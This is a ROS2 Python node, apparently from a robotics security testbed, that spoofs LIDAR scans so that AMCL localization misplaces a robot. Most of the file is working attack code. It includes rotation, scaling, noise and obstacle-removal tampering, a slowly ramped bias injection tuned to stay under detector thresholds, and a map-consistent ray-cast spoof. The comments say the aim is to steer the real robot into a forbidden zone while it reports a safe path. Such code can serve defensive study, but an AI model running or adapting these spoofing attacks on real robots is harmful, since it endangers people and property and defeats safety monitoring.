#!/usr/bin/env python3
"""
LIDAR Scan Spoofing Attack Node
================================

LIDAR 데이터를 조작해서 AMCL의 위치 추정을 혼란시킵니다.

공격 방법:
1. rotation_offset: 스캔 데이터를 회전시켜서 로봇이 다른 방향을 보고 있다고 착각
2. range_scale: 거리를 축소/확대해서 벽이 더 가깝거나 멀다고 착각
3. noise_injection: 랜덤 노이즈를 추가해서 AMCL 파티클 분산
4. obstacle_removal: 특정 방향의 장애물을 제거 (무한대로 설정)

사용법:
    ros2 run geofence_policy_enforcer attack_scan_spoofing --ros-args \
        -p rotation_offset:=0.5 \
        -p range_scale:=0.8 \
        -p input_topic:=/scan_real \
        -p output_topic:=/scan
"""

import rclpy
from rclpy.node import Node
from rclpy.qos import QoSProfile, QoSDurabilityPolicy, QoSReliabilityPolicy
from sensor_msgs.msg import LaserScan
from nav_msgs.msg import Odometry, OccupancyGrid
from std_msgs.msg import Bool
import numpy as np
import math
import time


class ScanSpoofingAttack(Node):
    """LIDAR 스캔 데이터를 스푸핑하는 공격 노드"""

    def __init__(self):
        super().__init__('scan_spoofing_attack')

        # 파라미터 선언
        self.declare_parameter('input_topic', '/scan_real')
        self.declare_parameter('output_topic', '/scan')
        self.declare_parameter('attack_enabled', True)

        # 공격 파라미터
        self.declare_parameter('rotation_offset', 0.0)  # 라디안 단위 회전
        self.declare_parameter('range_scale', 1.0)  # 거리 스케일 (0.8 = 20% 가깝게)
        self.declare_parameter('noise_stddev', 0.0)  # 노이즈 표준편차 (미터)
        self.declare_parameter('obstacle_remove_start', -1.0)  # 장애물 제거 시작 각도
        self.declare_parameter('obstacle_remove_end', -1.0)  # 장애물 제거 끝 각도
        self.declare_parameter('position_offset_x', 0.0)  # 위치 오프셋 시뮬레이션
        self.declare_parameter('position_offset_y', 0.0)
        self.declare_parameter('log_interval', 2.0)

        # -------------------------------------------------------------------
        # Sophisticated attack: STEALTHY TARGETED LOCALIZATION BIAS-INJECTION
        # -------------------------------------------------------------------
        # Instead of a crude rotation (which makes AMCL diverge chaotically and
        # Nav2 abort), inject a per-beam range offset that is *self-consistent*
        # with the sensor having translated by δ(t) in a chosen direction φ:
        #     r'(θ) = r(θ) − δ(t)·cos(θ − φ)      (1st-order range change of a
        #                                          rigid sensor translation)
        # AMCL matches this to the static map and coherently shifts its estimate,
        # so Nav2 — believing the robot is offset — steers the TRUE robot the
        # opposite way (into the forbidden zone) while reporting a "safe" path.
        #
        # δ(t) ramps slowly (bias_rate), so the per-update innovation stays below
        # the filter's motion-noise / χ² gate and below a memoryless residual
        # detector's threshold — i.e. the attack is STEALTHY (cf. Zeng et al.
        # USENIX Sec'18 gradual GPS spoofing; Urbina et al. CCS'16 stealthy FDI
        # bounded by the detector; Cao et al. CCS'19, Sun et al. USENIX Sec'20
        # LiDAR spoofing). Total offset is capped at bias_max.
        self.declare_parameter('attack_mode', 'legacy')   # 'legacy'|'bias_injection'|'map_consistent'
        self.declare_parameter('bias_rate', 0.0)          # m/s ramp of injected offset
        self.declare_parameter('bias_angle_deg', 180.0)   # laser-frame shift direction
        self.declare_parameter('bias_max', 2.0)           # cap on injected offset (m)
        self.declare_parameter('bias_ramp_delay', 0.0)    # s before ramp begins
        # -------------------------------------------------------------------
        # MOST sophisticated: MAP-CONSISTENT spoof (target-tracking adversary
        # WITH map knowledge — Sun et al. USENIX Sec'20). The 1st-order range
        # bias above only APPROXIMATES a rigid translation, so a well-localised
        # AMCL on a feature-rich map partially rejects it (scan inconsistency on
        # obliquely-oriented walls). Here the attacker instead RAY-CASTS the
        # known occupancy map from a spoofed pose S(t)=odom(t)+Δ(t) and emits the
        # EXACT scan a robot at S would observe. The forged scan is perfectly
        # map-consistent, so AMCL accepts it with no residual and converges to S.
        # Because S is anchored to odometry, the induced correction is exactly
        # c(t)=amcl−odom=Δ(t): a clean, monotonic, direction-consistent drift the
        # cross-channel CUSUM detects, while its slow per-update growth stays
        # under a memoryless jump gate (stealthy). Δ ramps at bias_rate along the
        # world direction world_bias_angle_deg (pose displacement; Nav2 then
        # steers the TRUE robot the opposite way, into the zone).
        self.declare_parameter('map_topic', '/map')
        self.declare_parameter('map_occ_thresh', 50)      # OccupancyGrid value ≥ = wall
        self.declare_parameter('map_max_range', 8.0)      # ray-cast cutoff (m)
        # Heading-compensated (world-frame) targeting. A laser-frame φ rotates
        # with the robot, so a fixed bias_angle_deg pushes AMCL in an
        # orientation-dependent (unreliable) world direction. A target-tracking
        # adversary (cf. Cao et al. CCS'19, Sun et al. USENIX Sec'20, who track
        # the victim's pose) instead maintains a CONSTANT world-frame drift: it
        # observes the robot yaw θ(t) and sets φ_laser(t) = ψ_world − θ(t), so
        # the induced sensor translation always points along ψ_world (e.g. +X,
        # toward the forbidden zone) no matter how the robot turns. This makes
        # the lure reliable instead of ~1-in-4 stochastic.
        self.declare_parameter('heading_compensate', False)
        self.declare_parameter('world_bias_angle_deg', 0.0)  # world-frame push dir
        self.declare_parameter('odom_topic', '/odom')
        # REALISM constraints (Sun USENIX'20 threat model): a physical LiDAR spoofer can
        # only inject/override a LIMITED angular sector and a limited number of points,
        # NOT a full 360° coherent scan. spoof_fov_deg = angular window (centered on the
        # bearing to the fake features) the spoofer can override (360 = idealized full
        # replacement). spoof_point_budget = max beams it can override (-1 = unlimited).
        # Beams outside the window keep the REAL scan → the true environment anchors AMCL
        # → the lure weakens as the spoofer gets more constrained.
        self.declare_parameter('spoof_fov_deg', 360.0)
        self.declare_parameter('spoof_point_budget', -1)

        # 파라미터 읽기
        input_topic = self.get_parameter('input_topic').value
        output_topic = self.get_parameter('output_topic').value
        self.attack_enabled = self.get_parameter('attack_enabled').value

        self.rotation_offset = self.get_parameter('rotation_offset').value
        self.range_scale = self.get_parameter('range_scale').value
        self.noise_stddev = self.get_parameter('noise_stddev').value
        self.obstacle_remove_start = self.get_parameter('obstacle_remove_start').value
        self.obstacle_remove_end = self.get_parameter('obstacle_remove_end').value
        self.position_offset_x = self.get_parameter('position_offset_x').value
        self.position_offset_y = self.get_parameter('position_offset_y').value
        self.log_interval = self.get_parameter('log_interval').value

        self.attack_mode = self.get_parameter('attack_mode').value
        self.bias_rate = self.get_parameter('bias_rate').value
        self.bias_angle = math.radians(self.get_parameter('bias_angle_deg').value)
        self.bias_max = self.get_parameter('bias_max').value
        self.bias_ramp_delay = self.get_parameter('bias_ramp_delay').value
        self.heading_compensate = self.get_parameter('heading_compensate').value
        self.world_bias_angle = math.radians(self.get_parameter('world_bias_angle_deg').value)
        self.spoof_fov = math.radians(self.get_parameter('spoof_fov_deg').value)
        self.spoof_point_budget = self.get_parameter('spoof_point_budget').value
        odom_topic = self.get_parameter('odom_topic').value
        self.map_occ_thresh = self.get_parameter('map_occ_thresh').value
        self.map_max_range = self.get_parameter('map_max_range').value
        self._robot_yaw = 0.0   # latest observed robot heading (rad)
        self._robot_x = 0.0     # latest observed robot position (odom frame ~ world)
        self._robot_y = 0.0
        # odom needed for world-frame heading compensation AND for map-consistent
        # spoofing (S = odom + Δ). Subscribe once if either uses it.
        if self.heading_compensate or self.attack_mode == 'map_consistent':
            self.odom_sub = self.create_subscription(
                Odometry, odom_topic, self.odom_callback, 10)
        # Occupancy map for the map-consistent ray-cast (latched → transient_local).
        self._occ = None
        self._map_ready = False
        if self.attack_mode == 'map_consistent':
            map_topic = self.get_parameter('map_topic').value
            map_qos = QoSProfile(depth=1)
            map_qos.durability = QoSDurabilityPolicy.TRANSIENT_LOCAL
            map_qos.reliability = QoSReliabilityPolicy.RELIABLE
            self.map_sub = self.create_subscription(
                OccupancyGrid, map_topic, self.map_callback, map_qos)

        # 상태 변수
        self.last_log_time = 0.0
        self.total_msgs = 0
        self._attack_start = None   # wall-clock of first scan (ramp origin)
        self._beam_angles = None    # cached per-beam angle array
        self._cur_delta = 0.0       # current injected offset magnitude (m)

        # Publisher/Subscriber
        self.scan_pub = self.create_publisher(LaserScan, output_topic, 10)
        self.scan_sub = self.create_subscription(
            LaserScan, input_topic, self.scan_callback, 10)

        # 공격 상태 publish
        self.attack_status_pub = self.create_publisher(
            Bool, '/attack/scan_spoofing/active', 10)

        # 상태 타이머
        self.status_timer = self.create_timer(0.5, self.publish_status)

        # 시작 로그
        self.get_logger().warn('=' * 60)
        self.get_logger().warn('LIDAR SCAN SPOOFING ATTACK NODE STARTED')
        self.get_logger().warn('=' * 60)
        self.get_logger().warn(f'  Input topic:  {input_topic}')
        self.get_logger().warn(f'  Output topic: {output_topic}')
        self.get_logger().warn(f'  Rotation offset: {math.degrees(self.rotation_offset):.1f} degrees')
        self.get_logger().warn(f'  Range scale: {self.range_scale}x')
        self.get_logger().warn(f'  Noise stddev: {self.noise_stddev}m')
        if self.obstacle_remove_start >= 0:
            self.get_logger().warn(f'  Obstacle removal: {math.degrees(self.obstacle_remove_start):.1f} to {math.degrees(self.obstacle_remove_end):.1f} degrees')
        self.get_logger().warn('=' * 60)
        self.get_logger().warn('Effect: AMCL will mislocalize the robot!')
        self.get_logger().warn('=' * 60)

    def odom_callback(self, msg: Odometry):
        """Track the victim robot's pose (heading for bias-compensation; full pose
        as the anchor S=odom+Δ for the map-consistent spoof)."""
        q = msg.pose.pose.orientation
        # yaw from quaternion (planar robot)
        siny = 2.0 * (q.w * q.z + q.x * q.y)
        cosy = 1.0 - 2.0 * (q.y * q.y + q.z * q.z)
        self._robot_yaw = math.atan2(siny, cosy)
        self._robot_x = msg.pose.pose.position.x
        self._robot_y = msg.pose.pose.position.y

    def map_callback(self, msg: OccupancyGrid):
        """Latch the occupancy grid the attacker ray-casts against."""
        W = msg.info.width
        H = msg.info.height
        data = np.asarray(msg.data, dtype=np.int16).reshape(H, W)
        self._occ = data >= self.map_occ_thresh   # unknown(-1)/free → not a wall
        self._map_ox = msg.info.origin.position.x
        self._map_oy = msg.info.origin.position.y
        self._map_res = msg.info.resolution
        self._map_HW = (H, W)
        if not self._map_ready:
            self._map_ready = True
            self.get_logger().warn(
                f'[MAP-SPOOF] map latched: {W}x{H} @ {self._map_res:.3f}m '
                f'origin=({self._map_ox:.2f},{self._map_oy:.2f}) '
                f'occ_cells={int(self._occ.sum())}')

    def _map_consistent_ranges(self, msg, Sx, Sy, Stheta):
        """Ray-cast the occupancy map from spoofed pose (Sx,Sy,Stheta) to build the
        EXACT LaserScan a robot there would see. Vectorised step-march over beams."""
        n = len(msg.ranges)
        if self._beam_angles is None or len(self._beam_angles) != n:
            self._beam_angles = (msg.angle_min
                                 + np.arange(n) * msg.angle_increment)
        world_ang = Stheta + self._beam_angles
        ca = np.cos(world_ang)
        sa = np.sin(world_ang)
        H, W = self._map_HW
        ox, oy, res = self._map_ox, self._map_oy, self._map_res
        rmax = min(float(msg.range_max), float(self.map_max_range))
        out = np.full(n, msg.range_max, dtype=np.float32)   # no-hit → range_max
        found = np.zeros(n, dtype=bool)
        d = max(float(msg.range_min), res)
        while d <= rmax:
            px = Sx + d * ca
            py = Sy + d * sa
            cx = ((px - ox) / res).astype(np.int32)
            cy = ((py - oy) / res).astype(np.int32)
            inb = (cx >= 0) & (cx < W) & (cy >= 0) & (cy < H) & (~found)
            idx = np.nonzero(inb)[0]
            if idx.size:
                hit = self._occ[cy[idx], cx[idx]]
                hi = idx[hit]
                if hi.size:
                    out[hi] = d
                    found[hi] = True
                    if found.all():
                        break
            d += res
        return out

    def scan_callback(self, msg: LaserScan):
        """스캔 메시지를 받아서 스푸핑 후 전달"""
        self.total_msgs += 1
        current_time = time.time()

        if not self.attack_enabled:
            # 공격 비활성: 원본 그대로
            self.scan_pub.publish(msg)
            return

        # 출력 메시지 생성
        out_msg = LaserScan()
        out_msg.header = msg.header
        out_msg.angle_min = msg.angle_min
        out_msg.angle_max = msg.angle_max
        out_msg.angle_increment = msg.angle_increment
        out_msg.time_increment = msg.time_increment
        out_msg.scan_time = msg.scan_time
        out_msg.range_min = msg.range_min
        out_msg.range_max = msg.range_max

        # ranges를 numpy 배열로 변환
        ranges = np.array(msg.ranges, dtype=np.float32)
        num_readings = len(ranges)

        # === MOST sophisticated: map-consistent ray-cast spoof ===
        if self.attack_mode == 'map_consistent':
            if self._attack_start is None:
                self._attack_start = current_time
            elapsed = max(0.0, current_time - self._attack_start - self.bias_ramp_delay)
            self._cur_delta = min(self.bias_max, self.bias_rate * elapsed)
            # Until the map latches, pass the real scan through (don't disturb the
            # initial AMCL convergence).
            if not self._map_ready:
                self.scan_pub.publish(msg)
                return
            # Spoofed pose S = odom + Δ, Δ along the world direction. Orientation
            # is the true (odom) heading — we only displace position, so AMCL's
            # correction is a pure translation c=Δ.
            dx = self._cur_delta * math.cos(self.world_bias_angle)
            dy = self._cur_delta * math.sin(self.world_bias_angle)
            Sx = self._robot_x + dx
            Sy = self._robot_y + dy
            Stheta = self._robot_yaw
            fake = self._map_consistent_ranges(msg, Sx, Sy, Stheta)
            # REALISM: restrict the override to a limited FoV window (+ point budget)
            # centered on the laser-frame bearing to the fake features; beams outside keep
            # the REAL scan so the true environment still anchors AMCL (weaker lure).
            self._spoof_frac = 1.0
            if self.spoof_fov < math.radians(359.9) or self.spoof_point_budget >= 0:
                if self._beam_angles is not None and len(self._beam_angles) == len(fake):
                    center = self.world_bias_angle - self._robot_yaw
                    dang = np.arctan2(np.sin(self._beam_angles - center),
                                      np.cos(self._beam_angles - center))
                    mask = np.abs(dang) <= (self.spoof_fov / 2.0)
                    if self.spoof_point_budget >= 0 and int(mask.sum()) > self.spoof_point_budget:
                        inwin = np.nonzero(mask)[0]
                        keep = inwin[np.argsort(np.abs(dang[inwin]))][:self.spoof_point_budget]
                        mask = np.zeros(len(fake), dtype=bool)
                        mask[keep] = True
                    fake = np.where(mask, fake, ranges)
                    self._spoof_frac = float(mask.mean())
            out_msg.ranges = fake.tolist()
            if msg.intensities:
                out_msg.intensities = list(msg.intensities)
            self.scan_pub.publish(out_msg)
            if current_time - self.last_log_time > self.log_interval:
                self.get_logger().warn(
                    f'[MAP-SPOOF] map-consistent δ={self._cur_delta:.3f}m '
                    f'ψ_world={math.degrees(self.world_bias_angle):.0f}° '
                    f'S=({Sx:.2f},{Sy:.2f},{math.degrees(Stheta):.0f}°) '
                    f'odom=({self._robot_x:.2f},{self._robot_y:.2f}) '
                    f'(rate={self.bias_rate}m/s) scans={self.total_msgs}')
                self.last_log_time = current_time
            return

        # === Sophisticated attack: stealthy targeted bias-injection ===
        if self.attack_mode == 'bias_injection':
            if self._attack_start is None:
                self._attack_start = current_time
            elapsed = max(0.0, current_time - self._attack_start - self.bias_ramp_delay)
            # slowly-ramped injected translation magnitude, capped
            self._cur_delta = min(self.bias_max, self.bias_rate * elapsed)
            if self._cur_delta > 1e-4:
                if self._beam_angles is None or len(self._beam_angles) != num_readings:
                    self._beam_angles = (msg.angle_min
                                         + np.arange(num_readings) * msg.angle_increment)
                # Effective laser-frame push direction. With heading compensation
                # φ_laser = ψ_world − θ_robot, so the induced translation always
                # points along ψ_world in the world frame (reliable lure); without
                # it, the fixed laser-frame bias_angle is used (legacy behaviour).
                if self.heading_compensate:
                    phi = self.world_bias_angle - self._robot_yaw
                else:
                    phi = self.bias_angle
                # r'(θ) = r(θ) − δ·cos(θ − φ): scan consistent with a δ translation
                delta_r = (self._cur_delta
                           * np.cos(self._beam_angles - phi)).astype(np.float32)
                valid = np.isfinite(ranges)
                ranges[valid] = ranges[valid] - delta_r[valid]
                ranges = np.maximum(ranges, msg.range_min)
            out_msg.ranges = ranges.tolist()
            if msg.intensities:
                out_msg.intensities = list(msg.intensities)
            self.scan_pub.publish(out_msg)
            if current_time - self.last_log_time > self.log_interval:
                if self.heading_compensate:
                    dir_str = (f'ψ_world={math.degrees(self.world_bias_angle):.0f}° '
                               f'(θ_robot={math.degrees(self._robot_yaw):.0f}°, '
                               f'φ_laser={math.degrees(self.world_bias_angle-self._robot_yaw):.0f}°)')
                else:
                    dir_str = f'φ_laser={math.degrees(self.bias_angle):.0f}°'
                self.get_logger().warn(
                    f'[BIAS-INJECT] stealthy δ={self._cur_delta:.3f}m @{dir_str} '
                    f'(rate={self.bias_rate}m/s, step≈{self.bias_rate*msg.scan_time:.4f}m) '
                    f'scans={self.total_msgs}')
                self.last_log_time = current_time
            return

        # 1. Rotation offset: 스캔 데이터를 회전
        if abs(self.rotation_offset) > 0.001:
            # 회전할 인덱스 수 계산
            rotation_indices = int(self.rotation_offset / msg.angle_increment)
            ranges = np.roll(ranges, rotation_indices)

        # 2. Range scale: 거리를 스케일링
        if abs(self.range_scale - 1.0) > 0.001:
            # inf가 아닌 값만 스케일링
            valid_mask = np.isfinite(ranges)
            ranges[valid_mask] *= self.range_scale

        # 3. Noise injection: 랜덤 노이즈 추가
        if self.noise_stddev > 0:
            noise = np.random.normal(0, self.noise_stddev, num_readings)
            valid_mask = np.isfinite(ranges)
            ranges[valid_mask] += noise[valid_mask].astype(np.float32)
            # 음수 방지
            ranges = np.maximum(ranges, msg.range_min)

        # 4. Obstacle removal: 특정 각도 범위의 장애물 제거
        if self.obstacle_remove_start >= 0 and self.obstacle_remove_end >= 0:
            for i in range(num_readings):
                angle = msg.angle_min + i * msg.angle_increment
                if self.obstacle_remove_start <= angle <= self.obstacle_remove_end:
                    ranges[i] = float('inf')

        out_msg.ranges = ranges.tolist()

        # intensities도 복사 (있으면)
        if msg.intensities:
            out_msg.intensities = list(msg.intensities)

        self.scan_pub.publish(out_msg)

        # 주기적 로그
        if current_time - self.last_log_time > self.log_interval:
            valid_count = np.sum(np.isfinite(ranges))
            self.get_logger().warn(
                f'[SCAN SPOOF] Processed {self.total_msgs} scans, '
                f'{valid_count}/{num_readings} valid readings')
            self.last_log_time = current_time

    def publish_status(self):
        """공격 상태 publish"""
        status_msg = Bool()
        status_msg.data = self.attack_enabled
        self.attack_status_pub.publish(status_msg)


def main(args=None):
    rclpy.init(args=args)
    node = ScanSpoofingAttack()

    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        node.get_logger().info('Scan spoofing attack shutting down...')
        node.get_logger().info(f'Stats: {node.total_msgs} messages processed')
    finally:
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
